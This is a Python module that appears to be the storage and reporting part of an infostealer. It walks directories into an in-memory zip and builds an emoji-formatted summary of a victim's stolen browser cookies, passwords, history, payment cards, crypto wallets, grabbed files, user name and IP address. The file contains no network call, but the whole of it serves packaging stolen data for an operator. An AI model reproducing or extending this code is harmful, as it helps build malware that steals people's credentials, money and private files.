from io import BytesIO
from os import path, walk
from textwrap import dedent
from zipfile import ZipFile, ZIP_DEFLATED
from typing import Union, List, Tuple, AnyStr, Optional, Any

from helper.helpers.dataclasses import Data, Field


class MemoryStorage:
    """
    Creates a storage in the memory.
    """
    def __init__(self):
        self.__buffer = BytesIO()
        self.__files = []
        self.__counts = []

    def add_from_memory(self, source_path: str, content: Union[str, bytes]) -> None:
        """
        Adds a file to the list of files.

        Parameters:
        - source_path [str]: File name or path inside the archive.
        - content [str|bytes]: File content.

        Returns:
        - None.
        """
        self.__files.append((source_path, content))

    def add_from_disk(self, source_path: str, zip_path: Optional[str] = None) -> None:
        """
        Adds a file path to the list of files.

        Parameters:
        - source_path [str]: File name or path to be copied.
        - zip_path [str]: Path to the file or folder in the archive.

        Returns:
        - None.
        """
        if path.isfile(source_path):
            if zip_path:
                self.__files.append((zip_path, open(source_path, "rb").read()))
            else:
                self.__files.append((path.basename(source_path), open(source_path, "rb").read()))

        elif path.isdir(source_path):
            for folder_name, _, file_names in walk(source_path):
                for file_name in file_names:
                    try:
                        file_path = path.join(folder_name, file_name)
                        name_in_zip = path.relpath(file_path, source_path)

                        if zip_path:
                            name_in_zip = path.join(zip_path, name_in_zip)

                        self.__files.append((name_in_zip, open(file_path, "rb").read()))
                    except Exception as e:
                        pass
        else:
            pass

    def add_data(self, name: str, data: Any) -> None:
        self.__counts.append(Field(name, data))

    @staticmethod
    def create_preview(fields: List[Field]) -> str:
        """
        Creates a preview of the collected data.

        Parameters:
        - fields [list]: List of fields with data.

        Returns:
        - None.
        """
        computer = {
            "User": "Unknown",
            "IP": "Unknown",
            "OS": "Unknown"
        }
        browsers = {
            "Cookies": 0,
            "Passwords": 0,
            "History": 0,
            "Bookmarks": 0,
            "Extensions": 0,
            "Cards": 0
        }
        applications, wallets, grabbers = [], [], []

        for field in fields:
            name, value = field.name, field.value

            if name in computer.keys():
                computer[name] = value

            elif name in browsers.keys():
                browsers[name] += value

            elif name == "Application":
                applications.append(value)

            elif name == "Wallet":
                wallets.append(value)

            elif name == "Grabber":
                grabbers.append(value)

        applications = ", ".join(set(applications)) if applications else "No applications found"
        wallets = ", ".join(set(wallets)) if wallets else "No wallets found"
        grabbers = ", ".join(set(grabbers)) if grabbers else "No grabbed files found"

        preview = dedent(f'''
        🖥️ User: {computer["User"]}
        📋 OS Name: {computer["OS"]}
        
        🍪 Cookies: {browsers["Cookies"]}
        🔒 Passwords: {browsers["Passwords"]}
        📖 History: {browsers["History"]}
        📚 Bookmarks: {browsers["Bookmarks"]}
        📦 Extensions: {browsers["Extensions"]}
        💳 Cards: {browsers["Cards"]}
        
        📁 Other applications:
        {applications}
        
        💸 Crypto wallets:
        {wallets}
        
        📝 Grabbed files:
        {grabbers}

        🌐 IP: {computer["IP"]}
        ''')

        return preview

    def get_data(self) -> Data:
        """
        Returns the contents of the archive.

        Parameters:
        - None.

        Returns:
        - None.
        """
        return Data(self.__files, self.__counts)

    def create_zip(self, files: Optional[List[Tuple[str, AnyStr]]] = None) -> BytesIO:
        """
        Adds files from a list of data returned by get_data method of other MemoryStorage objects into one archive.

        Parameters:
        - files [list]: List of files for creating the archive.

        Returns:
        - BytesIO: BytesIO object.
        """
        if files is None:
            files = self.__files

        with ZipFile(self.__buffer, mode='w', compression=ZIP_DEFLATED) as zip_file:
            for file_name, content in files:
                zip_file.writestr(file_name, content)

        self.__buffer.seek(0)
        return self.__buffer
